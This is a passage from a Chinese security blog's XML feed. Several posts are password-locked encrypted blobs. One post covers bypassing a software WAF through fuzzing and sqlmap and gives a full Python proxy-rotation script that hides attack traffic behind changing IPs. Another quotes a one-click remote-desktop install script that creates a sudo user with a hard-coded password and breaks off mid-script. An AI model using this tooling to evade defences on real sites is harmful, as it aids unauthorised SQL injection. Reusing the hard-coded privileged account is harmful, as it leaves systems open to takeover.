    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go操作浏览器很方便]]></title>
    <url>%2F2021%2F03%2F19%2F170_go%E6%93%8D%E4%BD%9C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BE%88%E6%96%B9%E4%BE%BF%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github博客上传报错解决案例]]></title>
    <url>%2F2021%2F03%2F18%2F169_github%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞银行1000种姿势绕过软WAF]]></title>
    <url>%2F2021%2F03%2F17%2F168_%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C1000%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BD%AFWAF%2F</url>
    <content type="text"><![CDATA[漏洞银行1000种姿势绕过软WAF 漏洞银行丨“1000种姿势”绕过软WAF –Python Fuzz脚本编写— V@1n3R丨咖面33期 QQ群：397745473 123456youtube 视频地址： https://www.youtube.com/watch?v=q6vWDLQ_1Hg标题：漏洞银行丨“1000种姿势”绕过软WAF --Python Fuzz脚本编写— V@1n3R丨咖面33期软件下载：http://public.xp.cn/upgrades/phpStudy20161103.ziphttps://www.lz1y.cn/ fuzz 脚本:在本地搭建安全狗测试fuzz他的正则 更多特殊字符测试 使用sqlmap进行测试 Sqlmap扩展—外部IP代理池实现用sqlmap加代理进行并用brup查看payload 12原文：https://blog.csdn.net/nzjdsds/article/details/77389212搜关键词：sqlmap代理池扩展脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265# -*-coding:utf-8-*-"""ayou"""importsocketfromsocketimporterrorimportthreadingimportrandomimporttime localtime=time.asctime(time.localtime(time.time())) classProxyServerTest(): def__init__(self,proxyip): #本地socket服务 self.ser=socket.socket(socket.AF_INET,socket.SOCK_STREAM) self.proxyip=proxyip defrun(self): try: #本地服务IP和端口 self.ser.bind(('127.0.0.1',9999)) #最大连接数 self.ser.listen(5) excepterrorase: print("[-]The local service : "+str(e)) return"[-]The local service : "+str(e) whileTrue: try: #接收客户端数据 client,addr=self.ser.accept() print('[*]accept %s connect'%(addr,)) data=client.recv(1024) ifnotdata: break print('[*'+localtime+']: Accept data...') excepterrorase: print("[-]Local receiving client : "+str(e)) return"[-]Local receiving client : "+str(e) whileTrue: #目标代理服务器，将客户端接收数据转发给代理服务器 mbsocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM) iplen=len(self.proxyip) proxyip=self.proxyip[random.randint(0,iplen-1)] print("[!]Now proxy ip:"+str(proxyip)) prip=proxyip[0] prpo=proxyip[1] try: mbsocket.settimeout(3) mbsocket.connect((prip,prpo)) except: print("[-]RE_Connect...") continue break# except :# print("[-]Connect failed,change proxy ip now...") # pass try: mbsocket.send(data) excepterrorase: print("[-]Sent to the proxy server : "+str(e)) return"[-]Sent to the proxy server : "+str(e) whileTrue: try: #从代理服务器接收数据，然后转发回客户端 data_1=mbsocket.recv(1024) ifnotdata_1: break print('[*'+localtime+']: Send data...') client.send(data_1) exceptsocket.timeoutase: print(proxyip) print("[-]Back to the client : "+str(e)) continue #关闭连接 client.close() mbsocket.close() defLoadips(): print("[*]Loading proxy ips..") ip_list=[] ip=['ip','port'] withopen("ips.txt")asips: lines=ips.readlines() forlineinlines: ip[0],ip[1]=line.strip().split(":") ip[1]=eval(ip[1]) nip=tuple(ip) ip_list.append(nip) returnip_list defmain(): print('''*Atuhor : V@1n3R.*Blog :http://www.Lz1y.cn*date: 2017.7.17*http://www.Lz1y.cn/wordpress/?p=643 __ __ _ _____ ____ \ \ / /_ _/ |_ __ |___ /| _ \ \ \ / / _` | | '_ \ |_ \| |_) | \ V / (_| | | | | |___) | _ &lt; _ \_/ \__,_|_|_| |_|____/|_| \_(_) ''') ip_list=Loadips() # ip_list = [('118.89.148.92',8088)]# ip_list = tuple(ip_list) try: pst=ProxyServerTest(ip_list) #多线程 t=threading.Thread(target=pst.run,name='LoopThread') print('[*]Waiting for connection...') #关闭多线程 t.start() t.join() exceptExceptionase: print("[-]main : "+str(e)) return"[-]main : "+str(e) if__name__=='__main__': main() QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建本地文档武器库]]></title>
    <url>%2F2021%2F03%2F04%2F167_%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E6%96%87%E6%A1%A3%E6%AD%A6%E5%99%A8%E5%BA%93%2F</url>
    <content type="text"><![CDATA[搭建本地文档武器库 anytxt搭建教程12345678910111213141.官网下载地址 https://anytxt.net/2.下载后安装选择中文3.启动软件，点击`工具-索引管理-索引服务-停止` 我只想对部分文件添加索引。默认是开启了许多类型的文件，并且开启了索引的服务，所以第一次运行先关闭索引服务，否则会花费很多时间进行索引。4.删除默认索引，点击`工具-索引管理-文件类型`，移除所有的类型。5.建立新的索引，点击面板中添加-文件夹。选择需要的文档文件夹，默认会识别文件夹中的文件类型，这里只需要word类型。点击确定软件立即创建索引。6.关闭索引定时更新，点击工具-索引管理-更新周期-从不。只需要你添加文件文档的时候手动更新一次即可。我们看到后台AnyTXT Searcher Indexing Service服务占用了大量的cpu，等待索引完成后就可以搜索。注意：索引没有创建完成的时候检索的速度慢且不准，需耐心等待。文件数量多的情况可能要一个小时。 QQ群：397745473 123更多参考： http://cn-sec.com/archives/182687.html洞见微信聚合离线版使用flask sqlite写一个简单的前端界面版本，包含分类，公众号仓库,搜索，上传数据，数据去重，公告。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux一键安装桌面系统脚本分析]]></title>
    <url>%2F2021%2F03%2F03%2F166.linux%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[linux一键安装桌面系统脚本分析 QQ群：397745473 linux一键安装桌面系统脚本分析 今天看到一个视频一键在google的notebooks中安装rdp环境,脚本写得很有创意,可以拿来学习一下 123视频地址: https://www.youtube.com/watch?v=PwiTojLrIlg文章地址: https://iecou.com/?p=408GITHUB: https://github.com/alok676875/ 脚本内容: 1234567891011121314151617181920212223242526272829303132333435#! /bin/bashprintf &quot;Check Out My Channel While Waiting- https://youtu.be/VeO22kIvZOQ&quot; &gt;&amp;2&#123;sudo useradd -m ALOKsudo adduser ALOK sudoecho &apos;ALOK:8426&apos; | sudo chpasswdsed -i &apos;s/\/bin\/sh/\/bin\/bash/g&apos; /etc/passwdsudo apt-get updatewget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.debsudo dpkg --install chrome-remote-desktop_current_amd64.debsudo apt install --assume-yes --fix-brokensudo DEBIAN_FRONTEND=noninteractive \apt install --assume-yes xfce4 desktop-basesudo bash -c &apos;echo &quot;exec /etc/X11/Xsession /usr/bin/xfce4-session&quot; &gt; /etc/chrome-remote-desktop-session&apos; sudo apt install --assume-yes xscreensaversudo systemctl disable lightdm.servicewget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.debsudo dpkg 